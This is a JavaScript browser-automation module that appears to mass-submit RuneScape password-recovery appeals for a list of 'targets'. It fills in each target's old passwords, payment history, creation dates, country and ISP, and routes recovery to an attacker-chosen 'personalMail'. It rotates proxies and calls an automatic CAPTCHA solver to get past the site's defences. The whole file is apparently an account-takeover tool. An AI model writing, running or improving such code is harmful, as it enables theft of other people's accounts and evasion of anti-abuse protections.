const { SolveCaptcha } = require("./captcha.js");

class Request {
  constructor(page, target) {
    this.page = page;
    this.target = target;
  }

  async SendRequest() {
    await this.Firstpage();
    await this.Secondpage();
    await this.Thirdpage();
  }

  async Firstpage() {
    try {
      await this.page.goto(
        "https://secure.runescape.com/m=accountappeal/passwordrecovery"
      );
      try {
        await this.page.waitForSelector(
          "#l-vista__container > p:nth-child(3)",
          {
            timeout: 1500,
          }
        );
        console.log(`${this.target.login} blocked.`);
        await this.page.close();
        return;
      } catch (error) {}
      await this.page.click("#CybotCookiebotDialogBodyButtonDecline", {
        timeout: 5000,
      });
      //      await this.page.waitForNavigation({ timeout: 10000 });
    } catch (error) {
      console.log(
        `Proxy down. target: ${this.target.login} | Proxy: ${this.target.proxy}`
      );
      await this.page.close();
      return;
    }
    await SolveCaptcha(this.page);
    await this.page.click("id=email");
    await this.page.fill("id=email", this.target.login);
    await this.page.click("id=passwordRecovery");
    await SolveCaptcha(this.page);
    await this.page.click("#l-vista__container > small > a");
    await SolveCaptcha(this.page);
    await this.page.click("#l-vista__container > p:nth-child(5) > a");
    await SolveCaptcha(this.page);
    await this.page.click("#reg_email");
  }

  // The this.target
  async Secondpage() {
    // Passwords
    await this.page.click("#add-password");
    await this.page.click("#password2");
    await this.page.click("#add-password");
    await this.page.click("#password3");
    try {
      const recovery_field = this.page.locator("#state_otherinfo");
      await recovery_field.waitFor({ state: "attached", timeout: 800 });
      await this.page.check("#norecoveries");
      const checked = await this.page.isChecked("#norecoveries");
      await expect(checked).toBeTruthy();
    } catch (error) {
      // Do nothing, account has no recovery questions, it's normal.
    }

    // Payment
    await this.page.hover("#paymenttype");
    await this.page.type("#paymenttype", this.target.paymentMethod);
    await this.page.waitForSelector("#subslength");
    await this.page.hover("#subslength");
    await this.page.type("#subslength", this.target.subLength);
    await this.page.hover("#earliestsubsmonth");
    await this.page.type("#earliestsubsmonth", this.target.creationMonth);
    await this.page.hover("#earliestsubsyear");
    await this.page.type("#earliestsubsyear", this.target.creationYear);

    // Creation date
    await this.page.hover("#creationmonth");
    await this.page.type("#creationmonth", this.target.creationMonth);
    await this.page.hover("#creationyear");
    await this.page.type("#creationyear", this.target.creationYear);

    // Country and State
    await this.page.hover("#country_otherinfo");
    await this.page.type("#country_otherinfo", this.target.country);
    try {
      const statefield = this.page.locator("#state_otherinfo");
      await statefield.waitFor({ state: "attached", timeout: 800 });
      await this.page.hover("#state_otherinfo");
      await this.page.type("#state_otherinfo", this.target.state);
    } catch (error) {
      // Just catch, because this.target is not from usa, we can still continue.
    }
    console.log("No recovery questions.");

    // Fill the page
    await this.page.click("id=reg_email");
    await this.page.fill("id=reg_email", this.target.personalMail);
    await this.page.fill("id=reg_email_conf", this.target.personalMail);
    await this.page.fill("id=password1", this.target.pass1);
    await this.page.fill("id=password2", this.target.pass2);
    await this.page.fill("id=password3", this.target.pass3);
    await this.page.fill("id=email", this.target.paymentmail);
    await this.page.fill("id=postcode", this.target.zipcode);
    await this.page.fill("id=isp", this.target.isp);
    await this.page.click("#submit_button");
  }
  // The after this.target
  async Thirdpage() {
    await SolveCaptcha(this.page);
    await this.page.waitForLoadState("networkidle");
    console.log(`Recovery sent for ${this.target.login}`);
    await this.page.close();
  }
}
module.exports = { Request };
